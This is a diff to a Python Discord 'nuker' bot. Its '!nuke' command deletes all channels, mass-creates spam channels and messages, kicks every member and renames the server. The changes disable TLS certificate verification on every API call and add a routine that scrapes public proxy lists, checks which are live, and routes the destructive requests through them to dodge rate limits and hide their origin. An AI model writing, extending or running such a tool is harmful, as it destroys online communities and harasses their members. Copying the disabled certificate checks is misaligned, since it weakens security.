@@ -1,4 +1,7 @@
+import re
+import socket
 from os import system
+
 from colorama import init
 
 init(autoreset=True)
@@ -87,7 +90,7 @@ headers = {'authorization': f'Bot {TOKEN}'}
 
 def get_all_channels():
     while True:
-        r = requests.get(f"https://discord.com/api/v10/guilds/{GUILD}/channels", headers=headers, proxies=get_proxy())
+        r = requests.get(f"https://discord.com/api/v10/guilds/{GUILD}/channels", headers=headers, proxies=get_proxy(), verify=False)
         if 'retry_after' in r.text:
             time.sleep(r.json()['retry_after'])
         else:
@@ -99,7 +102,7 @@ def get_all_channels():
 
 def get_all_roles():
     roles = []
-    response = requests.get(f'https://discord.com/api/v10/guilds/{GUILD}/roles', headers=headers)
+    response = requests.get(f'https://discord.com/api/v10/guilds/{GUILD}/roles', headers=headers, verify=False)
     if response.status_code == 200:
         roles_data = response.json()
         roles.extend(roles_data)
@@ -114,7 +117,7 @@ def get_all_roles():
 
 def remove_channel(_id):
     while True:
-        r = requests.delete(f"https://discord.com/api/v10/channels/{_id}", headers=headers, proxies=get_proxy())
+        r = requests.delete(f"https://discord.com/api/v10/channels/{_id}", headers=headers, proxies=get_proxy(), verify=False)
         if 'retry_after' in r.text:
             time.sleep(r.json()['retry_after'])
         else:
@@ -127,7 +130,7 @@ def channel(name):
     while True:
         json = {'name': f"{name}-{str(random.randrange(1, 987987987))}", 'type': 0}
         r = requests.post(f'https://discord.com/api/v10/guilds/{GUILD}/channels', headers=headers, json=json,
-                          proxies=get_proxy())
+                          proxies=get_proxy(), verify=False)
         if 'retry_after' in r.text:
             time.sleep(r.json()['retry_after'])
         else:
@@ -144,7 +147,7 @@ def send_message(_id):
     while True:
         json = {'content': random.choice(MESSAGES)}
         r = requests.post(f'https://discord.com/api/v10/channels/{_id}/messages', headers=headers, json=json,
-                          proxies=get_proxy())
+                          proxies=get_proxy(), verify=False)
         if 'retry_after' in r.text:
             time.sleep(r.json()['retry_after'])
 
@@ -152,7 +155,7 @@ def send_message(_id):
 def kick_member(_id):
     while True:
         url = f'https://discord.com/api/v10/guilds/{GUILD}/members/{_id}'
-        response = requests.delete(url, headers=headers, proxies=get_proxy())
+        response = requests.delete(url, headers=headers, proxies=get_proxy(), verify=False)
 
         if response.status_code == 204:
             # print(f"Successfully kicked member: {id}")
@@ -184,18 +187,13 @@ async def remove_members():
 
 
 PROXIES = []
-if USE_PROXY:
-    with open('proxies.txt', 'r') as f:
-        for line in f.read().splitlines():
-            PROXIES.append(line)
-        print(f"Loaded {len(PROXIES)} proxies.")
 
 
 def get_proxy():
     if not USE_PROXY:
         return None
     PROXY = random.choice(PROXIES)
-    return {"http": PROXY, "https": PROXY}
+    return {"https": PROXY}
 
 
 BOT = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
@@ -225,7 +223,7 @@ async def nuke(ctx):
     global GUILD
     GUILD = ctx.guild.id
     await ctx.message.delete()
-    threading.Thread(target=nuke_,).start()
+    threading.Thread(target=nuke_, ).start()
     await ctx.guild.edit(name=f"#SPIGOTRCE ON TOP {random.randrange(1, 987987987)}")
     await remove_members()
 
@@ -244,5 +242,116 @@ async def on_guild_channel_delete(_channel):
 async def on_member_remove(member):
     print(f"Kicked {member.name}")
 
+
+urls = """https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"""
+
+proxies = []
+good_proxies = list()
+
+
+def pattern_one(url):
+    ip_port = re.findall('(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3}:\d{2,5})', url)
+    if not ip_port:
+        pattern_two(url)
+    else:
+        for i in ip_port:
+            proxies.append(str(i))
+            good_proxies.append(i)
+
+
+def pattern_two(url):
+    ip = re.findall('>(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3})<', url)
+    port = re.findall('td>(\d{2,5})<', url)
+    if not ip or not port:
+        pattern_three(url)
+    else:
+        for i in range(len(ip)):
+            proxies.append(str(ip[i]) + ':' + str(port[i]))
+            good_proxies.append(str(ip[i]) + ':' + str(port[i]))
+
+
+def pattern_three(url):
+    ip = re.findall('>\n\s+(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3})', url)
+    port = re.findall('>\n\s+(\d{2,5})\n', url)
+    if not ip or not port:
+        pattern_four(url)
+    else:
+        for i in range(len(ip)):
+            proxies.append(str(ip[i]) + ':' + str(port[i]))
+            good_proxies.append(str(ip[i]) + ':' + str(port[i]))
+
+
+def pattern_four(url):
+    ip = re.findall('>(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3})<', url)
+    port = re.findall('>(\d{2,5})<', url)
+    if not ip or not port:
+        pattern_five(url)
+    else:
+        for i in range(len(ip)):
+            proxies.append(str(ip[i]) + ':' + str(port[i]))
+            good_proxies.append(str(ip[i]) + ':' + str(port[i]))
+
+
+def pattern_five(url):
+    ip = re.findall('(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3})', url)
+    port = re.findall('(\d{2,5})', url)
+    for i in range(len(ip)):
+        proxies.append(str(ip[i]) + ':' + str(port[i]))
+        good_proxies.append(str(ip[i]) + ':' + str(port[i]))
+
+
+def start(url):
+    try:
+        req = requests.get(url, headers={
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'}).text
+        pattern_one(req)
+        print(f' [+] Scrapping from: {url}')
+    except requests.exceptions.SSLError:
+        print(str(url) + ' [x] SSL Error')
+        return
+    print(str(url) + ' [x] Random Error')
+
+def check_proxy(proxy, online_proxies, offline_proxies):
+    try:
+        proxy_ip, proxy_port = proxy.split(':')
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)  # Adjust the timeout as needed
+        s.connect((proxy_ip, int(proxy_port)))
+        print(f"Proxy {proxy} is online.")
+        online_proxies.append(proxy)
+        s.close()
+    except:
+        offline_proxies.append(proxy)
+
+def fetch_proxies():
+    global PROXIES
+    threads = list()
+    for url in urls.splitlines():
+        if url:
+            x = threading.Thread(target=start, args=(url,))
+            x.start()
+            threads.append(x)
+
+    for th in threads:
+        th.join()
+    print(f' \n\n[/] Total scraped proxies: ({len(good_proxies)})')
+
+    online_proxies = []
+    offline_proxies = []
+
+    threads = []
+
+    for proxy in good_proxies:
+        t = threading.Thread(target=check_proxy, args=(proxy, online_proxies, offline_proxies))
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        t.join()
+
+    PROXIES = online_proxies
+
+if USE_PROXY:
+    fetch_proxies()
 
 BOT.run(TOKEN)
